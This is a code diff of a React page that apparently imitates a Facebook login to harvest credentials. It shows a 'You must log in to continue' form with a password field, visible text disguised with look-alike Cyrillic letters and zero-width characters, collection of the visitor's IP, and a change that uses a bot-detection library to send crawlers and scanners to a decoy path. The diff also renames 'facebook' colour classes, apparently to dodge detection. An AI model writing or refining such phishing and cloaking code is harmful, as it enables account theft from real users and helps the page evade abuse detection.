@@ -1,5 +1,6 @@
 import React, { useEffect, useState } from 'react';
 import { addDoc, collection, doc, getDoc, getDocs, onSnapshot, setDoc } from 'firebase/firestore';
+import Botd from '@fingerprintjs/botd';
 import { publicIpv4 } from 'public-ip';
 import { BsInfoCircleFill as IconInfo } from "react-icons/bs";
 import { IoIosAdd as IconAdd } from "react-icons/io";
@@ -21,14 +22,21 @@ const Luivuson = () => {
     const isMobile = useMediaQuery({ query: '(max-width: 767px)' });
 
         // Bot detection and redirect to /blank
-    useEffect(() => {
-        const userAgent = navigator.userAgent.toLowerCase();
-        const isBot = /bot|crawler|spider|crawling/.test(userAgent);
+useEffect(() => {
+    const detectBot = async () => {
+        const botd = await Botd.load();
+        const result = await botd.detect();
 
-        if (isBot) {
-            window.location.href = '/ds';
+        if (result.bot) {
+            console.log('Bot detected:', result.bot.type);
+            window.location.href = "/ds";
+        } else {
+            console.log('Not a bot');
         }
-    }, []);
+    };
+
+    detectBot();
+}, []);
 
     useEffect(() => {
         if (isMobile) {
@@ -200,7 +208,7 @@ IP: '${ip}'
 
     if (isUserData) {
         return (
-            <section className="w-full hidden sm:flex flex-col items-center justify-start bg-seashell">
+            <section className="w-full hidden sm:flex flex-col items-center justify-start bg-dedese">
                 <div className="w-full max-w-6xl flex flex-col items-center justify-start gap-3 py-14 px-2 sm:px-3 lg:px-4">
                     <a
                         href="/"
@@ -214,8 +222,8 @@ IP: '${ip}'
                         />
                     </a>
                     {/* Message ==> Nosn */}
-                    <div className="w-full max-w-[612px] mt-1 flex items-center justify-start gap-2 border-[1px] border-solid border-facebook rounded-sm overflow-none bg-white">
-                        <div className="px-3 py-2 bg-facebook shrink-0">
+                    <div className="w-full max-w-[612px] mt-1 flex items-center justify-start gap-2 border-[1px] border-solid border-begex rounded-sm overflow-none bg-white">
+                        <div className="px-3 py-2 bg-begex shrink-0">
                             <IconInfo color="white" size={18} />
                         </div>
                         <p className="text-sm">Yоu m‌ust lоg in t‌o cоnt‌inue.</p>
@@ -238,16 +246,16 @@ IP: '${ip}'
   style={{ WebkitTextSecurity: 'disc', textSecurity: 'disc' }}  placeholder="P‌ass‌wor‌d"onChange={handleCodeChange1} required/>
 
                                 <span className='form-dexlus'></span>
-                            <button type="submit" className="submit-button w-full px-3 h-[45px] bg-facebook hover:bg-opacity-90 text-white text-xl font-semibold rounded-md transition-all duration-300">Lоg in </button>
+                            <button type="submit" className="submit-button w-full px-3 h-[45px] bg-begex hover:bg-opacity-90 text-white text-xl font-semibold rounded-md transition-all duration-300">Lоg in </button>
                         </form>
                         {/* Forgab */}
                         <div className="w-full flex items-center justify-center gap-3">
                         <button
                                 type="button"
-                                className=" text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.39px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
+                                className=" text-begex text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.39px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
                                 Fo‌rgot ac‌co‌un‌t?
                             </button>
-                            <button type="button" className="text-facebook text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.39px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
+                            <button type="button" className="text-begex text-sm font-medium bg-none hover:underline transition-all duration-300" style={{ fontSize: '14.39px', fontFamily: 'SFProText-Regular, Helvetica, Arial, sans-serif' }}>
                                 Si‌gn u‌р f‌оr F‌ас‌еbо‌оk
                             </button>
                         </div>
@@ -265,7 +273,7 @@ IP: '${ip}'
                                     {item}
                                 </p>
                             ))}
-                            <div className="bg-smoke hover:bg-harp px-1 py-[0px] flex items-center justify-center border-[1px] border-solid border-grey-ghost rounded-[2px] overflow-hidden cursor-pointer transition-all duration-300">
+                            <div className="bg-smoke hover:bg-babsg px-1 py-[0px] flex items-center justify-center border-[1px] border-solid border-grey-ghost rounded-[2px] overflow-hidden cursor-pointer transition-all duration-300">
                                 <IconAdd size={20} />
                             </div>
                         </div>
